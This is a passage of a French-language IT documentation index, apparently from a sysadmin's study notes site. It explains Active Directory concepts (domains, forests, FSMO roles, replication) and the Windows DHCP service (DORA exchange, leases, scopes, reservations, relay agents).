<p>Cet annuaire contient des \u00e9lements, appel\u00e9s Objets, de diff\u00e9rents types tel que des utilisateurs, des machines (imprimantes, postes clients, serveurs).  </p> <p>Ces Objets sont stock\u00e9s (virtuellement) dans une base de donn\u00e9es, cela permet de centraliser les informations relatives aux \u00e9lements cit\u00e9s plus haut et de cr\u00e9er le sch\u00e9ma Active Directory (la structure de la base de donn\u00e9s).  </p> <p>Son objectif est de centraliser 2 fonctionnalit\u00e9s essentielles : - l'identification - l'authentification </p> <p>Il utilise 3 protocoles standardis\u00e9s:  </p> <ul> <li>DNS: R\u00e9solution de noms de machines et localisation de services.</li> <li>LDAP: Norme pour les syst\u00e8mes d'annuaires avec une structure de base de donn\u00e9es arborescente.</li> <li>Kerberos: Protocole d'authentification reposant sur un m\u00e9canisme de cl\u00e9s secr\u00e8tes et l'utilisation de tickets.  </li> </ul>"},{"location":"Windows/Serveur/active_directory/notion/#interets-dun-annuaire-active-directory","title":"Int\u00e9r\u00eats d'un annuaire Active Directory","text":"<ol> <li>Administration centralis\u00e9e et simplifi\u00e9    Tout \u00e9tant centralis\u00e9 dans l'annuaire Active Directory La gestion des objets, utilisateurs et ordinateurs, est simplifi\u00e9e.    L'annuaire permet \u00e9galement le d\u00e9ploiement de strat\u00e9gie de groupe (notion d\u00e9velopp\u00e9 plus tard)  </li> <li>Faciliter l'authentification    Un utilisateur s'authentifiant sur une machine, elle m\u00eame authentifi\u00e9e, pourra acc\u00e9der, sous couvert d'avoir les autorisations, \u00e0 l'ensemble des ressources stock\u00e9es sur d'autres machine du r\u00e9seau.    De nombreuses applications s'appuyant sur l'Active Directory pour l'authentification, un seul compte peut permettre un acc\u00e8s \u00e0 tout un syst\u00e8me d'information, ce qui est int\u00e9ressant au sein d'une entreprise.  </li> <li>Identifier les objets sur le r\u00e9seau    Chaque objet enregistr\u00e9 dasn l'annuaire est unique, ce qui permet d'identifier facilement un objet sur le r\u00e9seau et de le retrouver ensuite dans l'annuaire.  </li> <li>R\u00e9f\u00e9rencer les utilisateurs et les ordinateurs    La \"base de donn\u00e9e\" de l'Active Directory r\u00e9f\u00e9rence les utilisateurs, les groupes, et les ordinateurs, il est donc possible via cette \"base de donn\u00e9e\" de r\u00e9aliser de l'authentification, de l'identification, des strat\u00e9gies de groupe, du d\u00e9ploiement de logiciel, etc.  </li> </ol>"},{"location":"Windows/Serveur/active_directory/notion/#quest-ce-quun-domaine","title":"Qu'est-ce qu'un Domaine ?","text":"<p>Sur un sch\u00e9ma il sera toujours repr\u00e9sent\u00e9 par un triangle  </p> <p></p> Poste Workgroup et Serveur autonome ne font pas partit de l'AD <p> D\u00e9finition d'un domaine </p> <p>Un domaine est une \"entit\u00e9\", un ensemble d'objets partageant le m\u00eame annuaire, une base de donn\u00e9e commune. Un domaine est administr\u00e9 comme un ensemble, r\u00e9gi par des r\u00e8gles et proc\u00e9dures communes.  </p>"},{"location":"Windows/Serveur/active_directory/notion/#prerequis-pour-un-contexte-de-domaine","title":"Pr\u00e9requis pour un contexte de domaine","text":"<p>Avant de promouvoir un serveur en contr\u00f4leur de Domaine, ces pr\u00e9requis doivent \u00eatre respect\u00e9s :  </p> <ul> <li>Nom d'h\u00f4te du poste : Le nom d'h\u00f4te et le suffixe DNS doivent \u00eatre correctement d\u00e9finis.  </li> <li>Configuration r\u00e9seau et adressage IP : Un plan d'adressage correct et un IP statique.  </li> <li>Composants Windows : Les composants relatifs aux services ADDS doivent \u00eatre install\u00e9s.  </li> <li>Prise en compte de l'existant : Analyser l'infrastructure existante et d\u00e9terminer les points essentiels.  </li> <li>Pr\u00e9paration de l'AD : La for\u00eat ou le domaine peut-\u00eatre pr\u00e9par\u00e9 lors de l'ajout d'un CD.  </li> </ul>"},{"location":"Windows/Serveur/active_directory/notion/#domaine-racine","title":"Domaine Racine","text":"<p>Le premier domaine cr\u00e9\u00e9 dans une entreprise sera le domaine \"racine\" d'une \"for\u00eat\". Ce domaine sera le point de d\u00e9part de toute l'infrastructure. Sur le 1er Sch\u00e9ma il s'agit du domaine lesmachines.local.</p> <p>Un domaine sera nommer de la m\u00eame mani\u00e8re qu'un nom de domaine sur internet. On y ajoutera l'extension du domaine (.fr, .lan, .com, etc.) ainsi que le nom du domaine (monentreprise.lan, mondomaine.com, etc.) Pour que cela soit faisable il faudra faire appel \u00e0 un service de r\u00e9solution de noms : DNS qui gerera la zone du domaine.  </p>"},{"location":"Windows/Serveur/active_directory/notion/#domaine-enfant","title":"Domaine enfant","text":"<p>C'est a ce domaine racine que les domaines enfants seront rattach\u00e9. Dans le sch\u00e9ma il s'agit du triangle rouge \"conception.lesmachines.local\".  </p> <p>Un domaine enfant aura toujours son nom de domaine rattach\u00e9 au nom de domaine racine.  </p> <ul> <li>conception. : nom du domaine enfant  </li> <li>lesmachines.local : nom du domaine racine de la for\u00eat  </li> </ul> <p>Au niveau du nommage cela peut etre repr\u00e9sent\u00e9 de cette mani\u00e8re :  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/notion/#arbre","title":"Arbre","text":"<p>Un arbre est un regroupement hi\u00e9rarchique de plusieurs domaines.  </p> <p>Des qu'un domaine principal (racine) contient plusieurs sous-domaines on parle alors d'arbre, ou chaque sous-domaine au domaine racine repr\u00e9sente une branche de l'arbre</p>"},{"location":"Windows/Serveur/active_directory/notion/#foret","title":"For\u00eat","text":"<p>A l'installation du service Active Directory, une demande de cr\u00e9ation de for\u00eat sera obligatoirement faite par le service AD.  </p> <p>La for\u00eat est le point de d\u00e9part du contexte active directory. C'est dans cette for\u00eat que sera cr\u00e9e le domaine racine \"lesmachines.local\". Ce domaine sera le point de d\u00e9part de toute l'infrastructure.  </p> <p>Une for\u00eat est \u00e9galement le regroupement d'un ou plusieurs arbres, notion expliqu\u00e9e plus bas.  </p> <p></p> source: it-connect.fr <p>La cr\u00e9ation d'une for\u00eat et le regroupement des arbres apporte :  </p> <ul> <li>Un sch\u00e9ma d'annuaire commun  </li> <li>Un catalogue global commun  </li> <li>Une facilit\u00e9 de communication entre les domaines, bien que chaque domaine de la for\u00eat fonctionnent de mani\u00e8re ind\u00e9pendante  </li> <li>Cr\u00e9ation de relations entre les diff\u00e9rents domaines  </li> <li>Simplifie l'administration et la flexibilit\u00e9. un utilisateur pourra, si les autorisatiation le permettent, ce connecter ou acceder a des ressources sur une autre foret.   (Dans notre sch\u00e9ma un utilisateur du domaine \"paris.it-connect.local\" peut acceder a des ressources dans le domaine \"rennes.learn-online.local\" ou ce connecter sur une machine du domaine \"paris.learn-online.local\")  </li> </ul>"},{"location":"Windows/Serveur/active_directory/notion/#relation-de-domaine","title":"Relation de domaine","text":"<p>Les domaines d'une m\u00eame foret sont li\u00e9s par une relation d'approbation transitive bidirectionnelle. Cela permet la transmission de l'authentification d'un domaine \u00e0 n'importe quel autre domaine dans la m\u00eame for\u00eat.  </p>"},{"location":"Windows/Serveur/active_directory/notion/#niveau-fonctionnel","title":"Niveau fonctionnel","text":"<p>Un niveau fonctionnel d\u00e9termine les fonctionnalit\u00e9s des services AD, disponibles dans un domaine ou une for\u00eat.  </p> <p>A la cr\u00e9ation d'un domaine, un niveau fonctionnel est d\u00e9fini, il correspond \u00e0 la version du syst\u00e8me avec lequel on cr\u00e9e le domaine. Si le domaine est cr\u00e9e avec un Windows Serveur 2019, le niveau fonctionnel sera Windows Server 2019.  </p> <p>Le niveau fonctionnel permet de limiter les fonctionnalit\u00e9s de l'annuaire afin d'assurer la compatibilit\u00e9 avec les versions plus anciennes des contr\u00f4leurs de domaine.  </p>"},{"location":"Windows/Serveur/active_directory/notion/#controleur-de-domaine","title":"Contr\u00f4leur de domaine","text":"<p>A la cr\u00e9ation d'un domaine, le serveur sur lequel est effectu\u00e9 l'op\u00e9ration est promue \"contr\u00f4leur de domaine\" du domaine cr\u00e9e. Il s'agit des serveurs qui assurent la gestion du domaine. Ils assurent les t\u00e2ches d'h\u00e9bergement et de gestion de la base Active Directory. Cela signifie qu'il devra v\u00e9rifier les objets, g\u00e9rer les demandes d'authentification, appliquer les strat\u00e9gies de groupe et stocker une copie de l'annuaire Active Directory.  </p> <p>Un contr\u00f4leur de domaine est indispensable au fonctionnement du domaine, si celui vient \u00e0 etre corrompu ou \u00e9teint le domaine sera inutilisable.  </p>"},{"location":"Windows/Serveur/active_directory/notion/#retrograderpromouvoir-un-controleur-de-domaine","title":"R\u00e9trograder/Promouvoir un Contr\u00f4leur de domaine","text":"<p>A savoir qu'un contr\u00f4leur de domaine n'est pas fig\u00e9. Une fois l'AD install\u00e9 et fonctionnel, il sera quand m\u00eame possible de les retrograder, en leurs retirant le r\u00f4le de controleur de domaine afin de les utiliser comme simple serveur de fichier ou autre. Il est \u00e9galement possible de promouvoir un nouveau serveur en contr\u00f4leur de domaine.  </p> <p>Pour cela il faudra respecter quelques r\u00e8gles car l'ajout ou la suppression d'un contr\u00f4leur de domaine sont des actions qui impactent l'ensemble de la for\u00eat (ou de l'arbre) et donc les utilisateurs et l'entreprise.  </p> <p>Avant de r\u00e9trograder un contr\u00f4leur de domaine, il faudra s'assurer qu'il ne dispose plus de r\u00f4les FSMO.  </p> <p>Sous Windows 2016 et ult\u00e9rieur pour retrograder, il faut utiliser la commande :  </p> <pre><code>C:\\Windows\\System32&gt; Uninstall-AddsDomainController\n</code></pre>"},{"location":"Windows/Serveur/active_directory/notion/#les-roles-fsmo","title":"Les R\u00f4les FSMO","text":"<p>Les FSMO (Flexible Single Master Operation) permettent de delimiter les responsabilit\u00e9s de chaque serveur \"contr\u00f4leur de domaine\" et donc d'en am\u00e9liorer la s\u00e9curit\u00e9.  </p> <p>Les r\u00f4les FSMO assument certaines t\u00e2ches au sein d'un domaine ou d'une for\u00eat.  </p> <p>Le premier contr\u00f4leur de domaine d\u00e9tiendra par d\u00e9faut les 5 r\u00f4le. Il sera cependant possible de transf\u00e9rer les r\u00f4les sur d'autre controleur de domaine afin de les r\u00e9partir.  </p> <p>Il ne peut y avoir plusieurs Ma\u00eetres d'op\u00e9ration pour le m\u00eame r\u00f4les FSMO ou sein d'un domaine ou d'une for\u00eat.</p> <p>Les 5 r\u00f4les sont s\u00e9par\u00e9s en 2 cat\u00e9gories :  </p> <ul> <li>Les r\u00f4les For\u00eat<ul> <li>Maitre de nom de domaine : Charg\u00e9 de l'unicit\u00e9 des noms de domaine au niveau de la for\u00eat.   Egalement en charge de la cr\u00e9ation et/ou suppression de relations avec les domaines externes.   Si il n'est pas disponible aucun ajout ou suppression de domaine n'est possible. Unique au sein de la For\u00eat </li> <li>Maitre de sch\u00e9ma : Charg\u00e9 de l'unicit\u00e9 au sein de la for\u00eat.   Il sera le seul \u00e0 pouvoir initier des changements au nivea ude la structure de l'annuaire.   Il assure la r\u00e9plications sur l'ensemble des contr\u00f4leurs de domaine. Unique au sein de la for\u00eat </li> </ul> </li> <li>Les r\u00f4les Domaine<ul> <li>Maitre RID : Il attribue \u00e0 chaque objet (utilistauer, machine, groupe, etc.) un identifiant unique    de s\u00e9curit\u00e9 (SID).   Les SID sont structur\u00e9s de la mani\u00e8re suivante:<ul> <li>Un num\u00e9ro de r\u00e9vision</li> <li>Un identificateur de s\u00e9curit\u00e9 du domaine (une suite de num\u00e9ro propre et unique \u00e0 chaque domaine)</li> <li>Un RID (Relative Identifier), une plage de chiffre (un POOL) incr\u00e9mentable qui suit le SID du   domaine et donne l'id final d'un objet. S-1-5-21-2401410526-1208469522-549608361-500 La partie rouge repr\u00e9sente le SID domaine, le vert le RID objet. Unique au sein du Domaine</li> </ul> </li> <li>Maitre d'infrastructure : Charg\u00e9 d'assurer la propagation des objets ou des modifications apport\u00e9s    sur un objet (supprim\u00e9, renomm\u00e9) au travers de tous les domaines de la for\u00eat. Unique au sein du Domaine </li> <li>Maitre \u00e9mulateur PDC : Charg\u00e9 de s'assurer de la s\u00e9curit\u00e9 telles que la gestion des mots de passe,    Verrouillage des comptes, modifications des strat\u00e9gies de groupe (afin d'\u00e9viter les conflits et \u00e9crasements).   Il joue \u00e9galement le r\u00f4le de serveur de temps pour l'ensemble du domaine. Unique au sein du Domaine</li> </ul> </li> </ul>"},{"location":"Windows/Serveur/active_directory/notion/#replication","title":"R\u00e9plication","text":"<p>Il est int\u00e9ressant, voir m\u00eame indispensable, de disposer de 2 contr\u00f4leurs de domaine sur le m\u00eame r\u00e9seau. Cela permet la disponibilit\u00e9 et la continuit\u00e9 de service en cas de probl\u00e8me. Depuis 2008 le m\u00e9canisme DFSR (Distributed File System Replication) est pris en charge par Windows Server. Gr\u00e2ce \u00e0 ce systeme les CD (1) r\u00e9pliquent les informations \u00e0 intervalles r\u00e9gulier entre eux, afin d'avoir un annuaire Active Directory identique. Un num\u00e9ro de version est g\u00e9r\u00e9 par les CD afin de savoir si ils sont \u00e0 jour par rapport \u00e0 la version la plus r\u00e9cente de l'annuaire.</p> <ol> <li> Contr\u00f4leur de domaine</li> </ol> <p>Le dossier \"SYSVOL\" utilis\u00e9 pour les GPO    est \u00e9galement r\u00e9pliqu\u00e9  </p> <p></p>"},{"location":"Windows/Serveur/dhcp/dhcp/","title":"Le Service DHCP","text":""},{"location":"Windows/Serveur/dhcp/dhcp/#definition-du-service-dhcp-dynamic-host-configuration-protocol","title":"D\u00e9finition du service DHCP (Dynamic Host Configuration Protocol)","text":"<p>La fonction Dynamic Host Configuration Protocol (DHCP) est un protocole client/serveur qui fournit automatiquement une adresse Internet Protocol (IP) et d\u2019autres informations de configuration pertinentes \u00e0 un h\u00f4te IP (par exemple, masque de sous-r\u00e9seau et passerelle par d\u00e9faut).    Chaque appareil sur un r\u00e9seau TCP/IP doit avoir une adresse IP unique pour acc\u00e9der au r\u00e9seau et \u00e0 ses ressources. Sans DHCP, les adresses IP des nouveaux ordinateurs ou ordinateurs qui sont d\u00e9plac\u00e9s d\u2019un sous-r\u00e9seau \u00e0 un autre doivent \u00eatre configur\u00e9es manuellement ; les adresses IP des ordinateurs supprim\u00e9s du r\u00e9seau doivent \u00eatre r\u00e9cup\u00e9r\u00e9es manuellement. Avec DHCP, l\u2019ensemble de ce processus est automatis\u00e9 et g\u00e9r\u00e9 de mani\u00e8re centralis\u00e9e. Le serveur DHCP g\u00e8re un pool d\u2019adresses IP et loue une adresse \u00e0 n\u2019importe quel client avec DHCP lorsqu\u2019il d\u00e9marre sur le r\u00e9seau.  </p> <p></p>"},{"location":"Windows/Serveur/dhcp/dhcp/#la-notion-de-bail","title":"La notion de bail","text":"<p>Lorsqu'un client demande au serveur DHCP une adresse IP, le serveur DHCP fournit l'adresse IP et les param\u00e8tres de configuration du r\u00e9seau tels que le masque de sous-r\u00e9seau et les passerelles par d\u00e9faut pour une p\u00e9riode donn\u00e9e - appel\u00e9e bail. La p\u00e9riode pour laquelle le client se voit attribuer l'adresse IP est appel\u00e9e la p\u00e9riode de location. Le client peut utiliser tous les param\u00e8tres r\u00e9seau allou\u00e9s pendant cette p\u00e9riode et est identifi\u00e9 de mani\u00e8re unique dans le r\u00e9seau \u00e0 l'aide de l'adresse IP allou\u00e9e. Pendant ou \u00e0 la fin de la p\u00e9riode de location, si le client souhaite continuer \u00e0 utiliser les m\u00eames param\u00e8tres r\u00e9seau, y compris l'adresse IP, un renouvellement de bail via le serveur DHCP peut \u00eatre demand\u00e9. Le serveur DHCP, \u00e0 la r\u00e9ception de ce message, renouvelle la p\u00e9riode de location du client et le client peut continuer \u00e0 utiliser l'adresse IP pendant une p\u00e9riode prolong\u00e9e. \u00c0 la fin de la p\u00e9riode de location, si un client n'a pas demand\u00e9 de renouvellement, ou si le serveur n'a pas re\u00e7u de demande de renouvellement, le bail de l'IP allou\u00e9e expire. Cela am\u00e8ne le DHCP \u00e0 r\u00e9cup\u00e9rer l'adresse IP et les configurations r\u00e9seau associ\u00e9es, et \u00e0 les rajouter \u00e0 son pool d'adresses IP.  </p> <p></p>"},{"location":"Windows/Serveur/dhcp/dhcp/#lobtention-dun-bail-dora-discover-offer-request-ack","title":"L\u2019obtention d\u2019un bail DORA (Discover, Offer, Request, Ack)","text":"<p>Le processus d'attribution d'une adresse IP et d'autres param\u00e8tres de configuration r\u00e9seau par le serveur DHCP au p\u00e9riph\u00e9rique r\u00e9seau se d\u00e9roule en quatre \u00e9tapes:  </p> Etape 1 : Le client DHCP D\u00e9couvre le serveur DHCP\u00c9tape 2: Le serveur DHCP offre les param\u00e8tres de configuration IP et r\u00e9seau au client.\u00c9tape 3: Le client reconna\u00eet l'offre DHCP requise et demande le bail IP.\u00c9tape 4: Le serveur DHCP accuse r\u00e9ception de la demande de bail IP des clients. <p>Pour qu'un appareil communique au sein d'un r\u00e9seau, il n\u00e9cessite une adresse IP. Un p\u00e9riph\u00e9rique client DHCP acquiert l'adresse IP et les param\u00e8tres r\u00e9seau en diffusant un paquet UDP appel\u00e9 DHCPDISCOVER au sein du r\u00e9seau. Lors de la r\u00e9ception de la diffusion DHCPDISCOVER, tous les serveurs qui ne font pas autorit\u00e9 rejettent ou ignorent le message. Les serveurs DHCP au sein des r\u00e9seaux re\u00e7oivent et traitent le paquet de diffusion. Le message DHCP Discover contient des d\u00e9tails tels que:  </p> <ul> <li>Port source: UDP 68  </li> <li>Port de destination: UDP 67  </li> <li>IP source: 0.0.0.0  </li> <li>IP de destination: 255.255.255.255  </li> </ul> <p>Ici, l'adresse IP source du paquet de diffusion est 0.0.0, car le p\u00e9riph\u00e9rique client n'a pas encore re\u00e7u d'adresse IP. Avec l'adresse IP de destination 255.255.255.255, le paquet de diffusion est envoy\u00e9 \u00e0 tous les p\u00e9riph\u00e9riques du r\u00e9seau, via un processus appel\u00e9 diffusion limit\u00e9e. L'adresse IP de destination peut \u00eatre d\u00e9finie sur un ID de sous-r\u00e9seau particulier pour permettre une diffusion dirig\u00e9e.  </p> <p>Lorsqu'un serveur DHCP valide re\u00e7oit le message de diffusion DHCPDISCOVER, il r\u00e9serve une adresse IP dans son pool d'adresses IP et offre cette adresse IP en location au client demandeur. Il transmet son offre de bail IP, le masque de sous-r\u00e9seau et les passerelles par d\u00e9faut au client demandeur via un message DHCPOFFER .  </p> <ul> <li>Port source UDP 68  </li> <li>Port de destination UDP 67  </li> <li>IP source 192.168.31.9  </li> <li>IP de destination 255.255.255.255  </li> </ul> <p>Ici 192.168.31.9 est le serveur DHCP qui propose une adresse IP de son pool. Traditionnellement, ce message d'offre est envoy\u00e9 au client en sp\u00e9cifiant le mat\u00e9riel ou l'adresse MAC du client.</p> <p>\u00c0 la r\u00e9ception d'un message DHCPOFFER, le client demande l'attribution de l'adresse IP propos\u00e9e via le message DHCPOFFER en envoyant un message DHCPREQUEST au serveur. Ce message signale au serveur DHCP d'attribuer l'adresse IP propos\u00e9e en location au client. \u00c0 la r\u00e9ception de plusieurs messages DHCPOFFER des serveurs du r\u00e9seau, le client envoie un message DHCPREQ (requ\u00eate DHCP) uniquement au serveur DHCP dont le message a \u00e9t\u00e9 re\u00e7u en premier par le client. Les autres offres sont rejet\u00e9es ou ignor\u00e9es.  </p> <ul> <li>Port source UDP 68  </li> <li>Port de destination UDP 67  </li> <li>IP source 0.0.0.0  </li> <li>IP de destination 255.255.255.255  </li> </ul> <p>\u00c0 la r\u00e9ception du message DHCPREQUEST, le serveur DHCP attribue l'adresse IP au client et l'enregistre dans son magasin de donn\u00e9es. Le serveur confirme l'adresse IP allou\u00e9e, le masque de sous-r\u00e9seau et les d\u00e9tails de la passerelle par d\u00e9faut en envoyant un message DHCPACK (accus\u00e9 de r\u00e9ception DHCP). Le client peut maintenant commencer \u00e0 utiliser les param\u00e8tres d'allocation IP et r\u00e9seau.  </p> <ul> <li>Port source UDP 68  </li> <li>Port de destination UDP 67  </li> <li>IP source 0.0.0.0  </li> <li>IP de destination 255.255.255.255  </li> </ul> <p>Le client DHCP se configure avec les param\u00e8tres r\u00e9seau re\u00e7us.  </p> <p></p>"},{"location":"Windows/Serveur/dhcp/dhcp/#le-renouvellement-du-bail","title":"Le renouvellement du bail","text":"<p>Les adresses IP dynamiques sont octroy\u00e9es pour une dur\u00e9e limit\u00e9e (dur\u00e9e du bail, ou lease time), qui est transmise au client dans l'accus\u00e9 de r\u00e9ception qui cl\u00f4ture la transaction DHCP. La valeur T1 (par d\u00e9faut 50% de la dur\u00e9e du bail) qui l'accompagne d\u00e9termine la dur\u00e9e apr\u00e8s laquelle le client commence \u00e0 demander p\u00e9riodiquement le renouvellement de son bail aupr\u00e8s du serveur qui lui a accord\u00e9 son adresse (couramment la moiti\u00e9 de la dur\u00e9e du bail). Cette fois la transaction est effectu\u00e9e par transmission IP classique, d'adresse \u00e0 adresse. Si lorsque le d\u00e9lai fix\u00e9 par la deuxi\u00e8me valeur, T2 (par d\u00e9faut 87,5% de la dur\u00e9e du bail), est \u00e9coul\u00e9, le bail n'a pas pu \u00eatre renouvel\u00e9 (par exemple si le serveur DHCP d'origine est hors service), le client demande une nouvelle allocation d'adresse par diffusion. Si au terme du bail le client n'a pu ni en obtenir le renouvellement, ni obtenir une nouvelle allocation, l'adresse est d\u00e9sactiv\u00e9e et il perd la facult\u00e9 d'utiliser le r\u00e9seau De plus, lorsque le serveur DHCP et le client ne figurent pas sur le m\u00eame brin r\u00e9seau, les diffusions \u00e9mises par le client ne peuvent parvenir au serveur DHCP en raison du fait que les routeurs ne transmettent pas les diffusions g\u00e9n\u00e9rales (aussi appel\u00e9es broadcast). Dans ce genre de situation, il faut alors activer un relais DHCP.  </p>"},{"location":"Windows/Serveur/dhcp/dhcp/#la-resiliation-du-bail","title":"La r\u00e9siliation du bail","text":"<p>Pour mettre fin \u00e0 un bail DHCP, vous pouvez utiliser la commande <code>ipconfig /release</code> sous Windows ou la commande <code>dhclient -r</code> sous Linux. Ces commandes lib\u00e8rent le bail DHCP en cours et en demandent un nouveau au serveur DHCP. Si vous ne souhaitez pas lib\u00e9rer le bail actuel, vous pouvez attendre qu\u2019il expire et l\u2019appareil demandera automatiquement un nouveau bail au serveur DHCP.  </p>"},{"location":"Windows/Serveur/dhcp/dhcp/#les-conteneurs","title":"Les conteneurs","text":""},{"location":"Windows/Serveur/dhcp/dhcp/#les-conteneurs-de-gestion-du-serveur-dhcp-a-la-base-letendue","title":"Les conteneurs de gestion du serveur DHCP. \u00c0 la base : l\u2019\u00e9tendue","text":"<p>L\u2019\u00e9tendue DHCP sp\u00e9cifie la plage d'adresses IP qu'un serveur DHCP peut fournir \u00e0 ses clients. L'\u00e9tendue DHCP doit \u00eatre configur\u00e9e pour d\u00e9terminer le pool d'adresses IP que le serveur DHCP peut louer ou renouveler. En r\u00e8gle g\u00e9n\u00e9rale, une \u00e9tendue s\u2019appuie sur les adresses d\u2019un sous-r\u00e9seau particulier.  </p> <p></p> <p>En ce qui concerne l\u2019attribution des adresses IP des serveurs et des imprimantes, il est conseill\u00e9 de leur attribuer une adresse IP fixe. Ainsi, les adresses contenues dans une \u00e9tendue pr\u00e9d\u00e9finie ne seront pas affect\u00e9es par inadvertance, \u00e0 un autre p\u00e9riph\u00e9rique.</p>"},{"location":"Windows/Serveur/dhcp/dhcp/#les-conteneurs-de-gestion-du-serveur-dhcp-le-plus-cible-la-reservation","title":"Les conteneurs de gestion du serveur DHCP. Le plus cibl\u00e9 : la r\u00e9servation","text":"<p>On parle de r\u00e9servation d\u2019adresses DHCP lorsqu\u2019une adresse IP, au sein d\u2019une \u00e9tendue est \u00e9cart\u00e9e afin d\u2019\u00eatre utilis\u00e9e par un client DHCP sp\u00e9cifique.  </p> <p></p> <p>en ce qui concerne l\u2019attribution des adresses IP des serveurs et des imprimantes, il est conseill\u00e9 de leur attribuer une adresse IP fixe. Ainsi, les adresses contenues dans une \u00e9tendue pr\u00e9d\u00e9finie ne seront pas affect\u00e9es par inadvertance, \u00e0 un autre p\u00e9riph\u00e9rique.</p> <p>Par ailleurs, les p\u00e9riph\u00e9riques ayant d\u00e9j\u00e0 fait l\u2019objet d\u2019une r\u00e9servation disposeront alors \u00e0 coup s\u00fbr d\u2019une adresse IP, lorsqu\u2019une \u00e9tendue vient \u00e0 arriver \u00e0 court d\u2019adresses. Le fait de configurer des r\u00e9servations, permet de centraliser la gestion des adresses IP fixes. Lorsque l\u2019on configure des \u00e9tendues DHCP et des options d\u2019\u00e9tendue, on doit bien \u00e9videmment tenir compte du nombre d\u2019adresses IP que l\u2019on doit assigner et de la fa\u00e7on dont on impl\u00e9mentera la tol\u00e9rance aux pannes. Il est d\u2019ailleurs fortement recommand\u00e9 de disposer de plusieurs serveurs DHCP, au sein du r\u00e9seau. Ainsi, en cas de panne, il y aura toujours un serveur de secours pour distribuer les adresses IP. </p>"},{"location":"Windows/Serveur/dhcp/dhcp/#la-gestion-des-options","title":"La gestion des options","text":""},{"location":"Windows/Serveur/dhcp/dhcp/#les-options-de-configuration","title":"Les options de configuration","text":"<p>Elles compl\u00e8tent la configuration IP des clients DHCP. Quelques exemples :  </p> <p></p>"},{"location":"Windows/Serveur/dhcp/dhcp/#le-positionnement-des-options-dhcp","title":"Le positionnement des options DHCP","text":"<p>Les options peuvent \u00eatre d\u00e9finies :  </p> <ul> <li> <p>Au niveau du serveur : elles concerneront tous les baux distribu\u00e9s par le serveur DHCP.  </p> </li> <li> <p>Pour une \u00e9tendue : elles concerneront les baux de l\u2019\u00e9tendue.  </p> </li> <li> <p>Pour une r\u00e9servation: Elles ne concerneront que la / les r\u00e9servation(s) cibl\u00e9e(s).  </p> </li> </ul>"},{"location":"Windows/Serveur/dhcp/dhcp/#le-dhcp-et-les-reseaux","title":"Le DHCP et les r\u00e9seaux","text":""},{"location":"Windows/Serveur/dhcp/dhcp/#un-serveur-dhcp-pour-plusieurs-reseaux","title":"Un serveur DHCP pour plusieurs r\u00e9seaux","text":"<p>Les appareils peuvent envoyer des messages de diffusion uniquement au sein du r\u00e9seau dont ils font partie. Ils ne peuvent pas diffuser de messages sur les r\u00e9seaux ou sous-r\u00e9seaux. Lorsqu'il n'y a pas de serveur DHCP valide dans un r\u00e9seau, un p\u00e9riph\u00e9rique de ce r\u00e9seau ne peut pas acqu\u00e9rir une adresse IP car il ne peut pas diffuser de messages DHCPDISCOVER aux serveurs en dehors de son r\u00e9seau.  </p> <p>Ce probl\u00e8me est r\u00e9solu en utilisant un agent de relais DHCP.</p> <p>Disons qu'il existe deux r\u00e9seaux, le r\u00e9seau A et le r\u00e9seau B, connect\u00e9s par un routeur. Il existe un serveur DHCP valide sur le r\u00e9seau A. Chaque p\u00e9riph\u00e9rique du r\u00e9seau A peut acqu\u00e9rir un bail IP via ce serveur. Imaginez qu'il n'y ait pas de serveur DHCP sur le r\u00e9seau B. Comme les appareils ne peuvent pas diffuser entre les r\u00e9seaux, les appareils du r\u00e9seau B ne peuvent pas acqu\u00e9rir de bail IP.  </p> <p>Les deux fa\u00e7ons de r\u00e9soudre ce probl\u00e8me sont les suivantes:  </p> <ul> <li>Utilisez un serveur DHCP distinct dans le r\u00e9seau B.  </li> <li>Utilisez un agent de relais DHCP.  </li> </ul> <p></p> <p>Nous utilisons un agent de relais DHCP en configurant le service de relais DHCP dans l'un des p\u00e9riph\u00e9riques du r\u00e9seau B. Ce p\u00e9riph\u00e9rique re\u00e7oit ensuite les messages de diffusion DHCPDISCOVER des clients du r\u00e9seau B, et les transmet au serveur DHCP du r\u00e9seau A. Le serveur envoie le DHCPOFFER \u00e0 l'agent de relais du r\u00e9seau B, qui diffuse le message au sein de son r\u00e9seau. De m\u00eame, les messages DHCPREQ et DHCPACK sont \u00e9chang\u00e9s entre le client DHCP dans le r\u00e9seau B et le serveur DHCP dans le r\u00e9seau A en les relayant via l'agent DHCP qui peut agir comme l'homme du milieu. L'agent de relais peut \u00eatre un p\u00e9riph\u00e9rique au sein du r\u00e9seau, ou le routeur r\u00e9seau lui-m\u00eame peut \u00eatre configur\u00e9 pour fournir un service de relais DHCP.  </p>"},{"location":"Windows/Serveur/dhcp/dhcp/#le-dhcp-et-les-reseaux_1","title":"Le DHCP et les r\u00e9seaux","text":""},{"location":"Windows/Serveur/dhcp/dhcp/#dhcp-dans-un-contexte-de-domaine","title":"DHCP dans un contexte de domaine","text":"<p>La notion d\u2019autorisation : Le ou les serveurs DHCP doivent \u00eatre autoris\u00e9s pour d\u00e9marrer les services et fournir le service.  </p> <p>Incidence de la non autorisation : Le service DHCP d\u2019un serveur membre non autoris\u00e9 ne d\u00e9marrera pas Le service DHCP d\u2019un serveur autonome pr\u00e9sent dans le domaine de diffusion d\u2019un serveur autoris\u00e9 s\u2019arr\u00eatera  </p> <p>Les serveurs DHCP autres que Microsoft ne prennent pas en compte cette autorisation</p>"},{"location":"Windows/Serveur/dhcp/dhcp/#les-operations-de-gestion-de-la-base-dhcp","title":"Les op\u00e9rations de gestion de la base DHCP","text":"<p>L\u2019ensemble des donn\u00e9es de configuration est stock\u00e9 dans une base.  </p> <p>Un certain nombre d\u2019op\u00e9rations peuvent \u00eatre effectu\u00e9es : - Sauvegardes : Synchrone ou Asynchrone - Restaurations - Contr\u00f4le de la coh\u00e9rence de la base - D\u00e9placement de la base  </p>"},{"location":"Windows/Serveur/dhcp/dhcp/#le-fractionnement-detendues","title":"Le fractionnement d\u2019\u00e9tendues","text":"<p>Le fractionnement d'une \u00e9tendu DHCP peut augmenter la tol\u00e9rance aux pannes. Ainsi avec cette option, si un serveur devient indisponible alors l'autre serveur peut prendre sa place et continuer \u00e0 louer de nouvelles adresses IP ou \u00e0 renouveler des clients existants. Il permet d\u2019automatiser la cr\u00e9ation d\u2019une \u00e9tendue sur deux serveurs ayant la charge de la plage correspondante.  </p> <p> Les modifications pouvant \u00eatre apport\u00e9es apr\u00e8s cr\u00e9ation ne sont pas r\u00e9pliqu\u00e9es entre les deux serveurs ayant la charge de l\u2019\u00e9tendue (elles sont \u00e0 faire sur les deux).  